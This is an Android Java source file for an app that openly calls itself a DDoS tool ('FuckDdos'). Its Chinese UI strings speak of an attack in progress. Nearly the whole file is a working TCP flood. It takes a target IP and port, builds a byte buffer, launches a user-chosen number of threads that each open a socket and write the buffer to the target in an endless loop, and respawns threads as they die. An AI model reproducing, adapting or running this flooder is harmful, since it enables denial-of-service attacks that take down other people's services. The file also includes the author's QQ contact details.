package com.greyCloud.ddos;

import android.app.*;
import android.os.*;
import android.widget.*;
import android.view.*;
import android.view.View.*;
import java.net.*;
import android.support.v7.app.ActionBarActivity;
import java.io.*;
import java.util.*;
public class MainActivity extends ActionBarActivity
{
	public static byte[] buffer;
	public static ProgressDialog pd;
	public static String ipS;
	TextView kill;
	public static int port;
	public static long killN=0;
	boolean lock=false;
	private Handler uiHandler = new Handler();
	AlertDialog dialog;
	boolean stop=false;
	public static long h=0;
	//MyHandler mHandler = new MyHandler();
    @Override
    protected void onCreate(Bundle savedInstanceState)
    {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.main);
				Button btn1 = (Button) findViewById(R.id.button1);
				Button btn2 = (Button) findViewById(R.id.button2);
        //监听button事件
				pd=new ProgressDialog(this);
				dialog=new AlertDialog.Builder(this).create();
				btn2.setOnClickListener(new OnClickListener() {
				@Override
				public void onClick(View v) {
					if(!lock){
						dialog.setTitle("警告");
						dialog.setMessage("当前没有在执行攻击");
						dialog.show();
						return;
					}
					stop=true;
					dialog.setTitle("成功");
					dialog.setMessage("成功发送停止请求，线程将在不久后全部停止，由于线程存活计算的不够准确，请在线程保持不动后再重新开始");
					dialog.show();
					lock=false;
				}
			});
        btn1.setOnClickListener(new OnClickListener() {
					@Override
					public void onClick(View v) {
						if(lock){
							dialog.setTitle("警告");
							dialog.setMessage("当前攻击正在执行");
							dialog.show();
							return;
						}
						pd.setProgressStyle(ProgressDialog.STYLE_SPINNER);
						pd.setCanceledOnTouchOutside(false);
						pd.setMessage("初始化...");
						pd.show();
						lock=true;
						stop=false;
						Thread2 t=new Thread2();
						t.start();
					}
					
				class Thread1 extends Thread{
					@Override
					public void run(){
						MainActivity.h++;
						if(stop){
							//bf.close();
							//dos.close();
							//os.close();
							//s.close();
							throw new RuntimeException("stop");
						}
						
						Runnable runnable = new Runnable() {
							@Override
							public void run() {
								//System.out.println("Runnable thread id " + Thread.currentThread().getId());
									MainActivity.this.kill.setText("正在攻击，当前已死亡线程\n"+MainActivity.killN+"\n当前存活线程"+MainActivity.h);
							}
						};
						uiHandler.post(runnable);
						Socket s=null;
						OutputStream os=null;
						DataOutputStream dos=null;
						BufferedOutputStream bf=null;
						try {
							s=new Socket(MainActivity.ipS,MainActivity.port);
							//流准备
							//s.setSoTimeout(
							os=s.getOutputStream();
							dos=new DataOutputStream(os);
							bf=new BufferedOutputStream(dos);
							while(true) {
								if(stop){
									bf.close();
									dos.close();
									os.close();
									s.close();
									throw new RuntimeException("stop");
								}
								bf.write(MainActivity.buffer);
								bf.flush();
							}
						}catch(Exception e) {
							MainActivity.killN++;
							MainActivity.h--;
							//MainActivity.kill.setText("正在攻击，当前已死亡线程:"+MainActivity.killN);
							Runnable runnable1 = new Runnable() {
								@Override
								public void run() {
									//System.out.println("Runnable thread id " + Thread.currentThread().getId());
									if(stop){
										MainActivity.this.kill.setText("正在停止，当前存活线程\n"+MainActivity.h);
									}else{
										MainActivity.this.kill.setText("正在攻击，当前已死亡线程\n"+MainActivity.killN+"\n当前存活线程"+MainActivity.h);
									}
								}
							};
							uiHandler.post(runnable1);
							//System.out.println("线程死亡，重生！"+e.getMessage());
							//Runnable thread1 = new Thread1(); 
							if(stop){
								return;
							}
							Thread thread2 = new Thread1();
							thread2.start();//启动线程
						}
					}
				}
					class Thread2 extends Thread{
						@Override
						public void run(){
							Runnable runnable = new Runnable() {
								@Override
								public void run() {
									//System.out.println("Runnable thread id " + Thread.currentThread().getId());
									LinearLayout ll;
									EditText ip=null;
									int b=0;
									EditText thread;
									EditText buff=null;
									try{
										ll=(LinearLayout)findViewById(R.id.ll);
										kill=(TextView)findViewById(R.id.killThread);
										ip=(EditText)findViewById(R.id.ip);
										buff=(EditText)findViewById(R.id.buff);
										thread=(EditText)findViewById(R.id.thread);
										kill.setText("正在攻击,当前已死亡线程:\n0\n当前存活线程:0");
										MainActivity.h=0;
										MainActivity.killN=0;
									}catch(Exception e){
										pd.cancel();
										dialog.setTitle("错误");
										dialog.setMessage("初始化失败："+e.getMessage());
										dialog.show();
										return;
									}
									pd.setMessage("解析ip...");
									String[] temp=ip.getText().toString().split(":");
									if(temp.length!=2){
										pd.cancel();
										dialog.setTitle("错误");
										dialog.setMessage("ip格式错误");
										dialog.show();
										return;
									}
									ipS=temp[0];
									try{
										b=Integer.parseInt(buff.getText().toString());
									}catch(Exception e){
										pd.cancel();
										dialog.setTitle("错误");
										dialog.setMessage("缓冲大小错误");
										dialog.show();
										return;
									}
									port=Integer.parseInt(temp[1]);
									pd.show();
									pd.setMessage("正在创建缓冲区...");
									try{
										buffer=new byte[1024*b];
										for(int i=0;i<1024*b;i++) {
											buffer[i]=127;
										}
									}catch(Exception e){
										pd.cancel();
										dialog.setTitle("错误");
										dialog.setMessage("创建缓冲区时发生错误："+e.getMessage());
										dialog.show();
										return;
									}
									pd.setMessage("正在释放线程...");
									try{
										int t=Integer.parseInt(thread.getText().toString());
										for(int i=0;i<t;i++) {
											//Runnable thread1 = new Thread1(); 
											Thread1 thread2 = new Thread1();
											thread2.start();//启动线程
										}
									}catch(Exception e){
										pd.cancel();
										dialog.setTitle("错误");
										dialog.setMessage("释放线程时发生错误："+e.getMessage());
										dialog.show();
										return;
									}
									MainActivity.pd.cancel();
									ll.setVisibility(View.VISIBLE);
									}
							};
							uiHandler.post(runnable);
							
						}
					}
				});
		
    }
	@Override
	public boolean onCreateOptionsMenu(Menu menu)
	{
		// Inflate main_menu.xml 
		MenuInflater inflater = getMenuInflater();
		inflater.inflate(R.layout.main_menu, menu);
		return true;
	}

	@Override
	public boolean onOptionsItemSelected(MenuItem item)
	{
		switch (item.getItemId())
		{
			case R.id.about:
				AlertDialog dialog=new AlertDialog.Builder(this).create();
				dialog.setMessage("作者:菜问先生\nQQ:2970046657\n出品:灰色云团队\ngithub:https://github.com/greyCloudTeam/FuckDdos");
				dialog.show();
				return true;
			case R.id.updata:
				AlertDialog dialog1=new AlertDialog.Builder(this).create();
				dialog1.setMessage("1.3更新内容:\n增加了右上角菜单\n增加了停止攻击\n新增统计存活线程");
				dialog1.show();
				return true;
		}
		return super.onOptionsItemSelected(item);
	}
}
